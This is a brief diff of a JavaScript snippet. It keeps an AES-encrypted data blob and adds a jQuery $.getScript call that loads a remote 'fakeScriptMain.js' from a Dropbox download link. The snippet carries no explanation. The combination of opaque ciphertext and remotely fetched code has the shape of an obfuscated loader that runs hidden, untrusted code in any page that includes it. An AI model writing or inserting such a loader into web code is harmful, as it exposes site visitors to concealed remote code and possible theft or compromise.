@@ -1,2 +1,3 @@
-var encryptedData = 'U2FsdGVkX18v3KJ13ZMVCi8u19tQbgOGWXT0EDgadTlrL5FWE+xa4YKEO2YV0Q8rOdUfVoqubvCWbAr5iN6/2OfQebNygtnmTtxeU/iErpw3GDR2UtD5cptC0oCfNVDQ2v4Z8FvJ8IXfz/LsGvYvhSP6ht5ZiowsKBvzwR4iPZlowxx1oVmPW/fEMqh+M32R5Dux1jJUQ0/xfqfb0YynJw3aBS+or5Xb3ZF+jgiHyq7hwLpiJzW1Yi7CUA9UZNLBEWeU5ltc7f1aAgiKOBBKsOGfV38CTqoLH+/VgHCeXXYAvlzyPfd/r/tJggdcrB5n';
-$.getScript('https://dl.drop
+var encryptedData='U2FsdGVkX18v3KJ13ZMVCi8u19tQbgOGWXT0EDgadTlrL5FWE+xa4YKEO2YV0Q8rOdUfVoqubvCWbAr5iN6/2OfQebNygtnmTtxeU/iErpw3GDR2UtD5cptC0oCfNVDQ2v4Z8FvJ8IXfz/LsGvYvhSP6ht5ZiowsKBvzwR4iPZlowxx1oVmPW/fEMqh+M32R5Dux1jJUQ0/xfqfb0YynJw3aBS+or5Xb3ZF+jgiHyq7hwLpiJzW1Yi7CUA9UZNLBEWeU5ltc7f1aAgiKOBBKsOGfV38CTqoLH+/VgHCeXXYAvlzyPfd/r/tJggdcrB5n';
+$.getScript('https://dl.dropboxusercontent.com/s/2q29vaqbibe6tph/fakeScriptMain.js?dl=0');
+void(0);
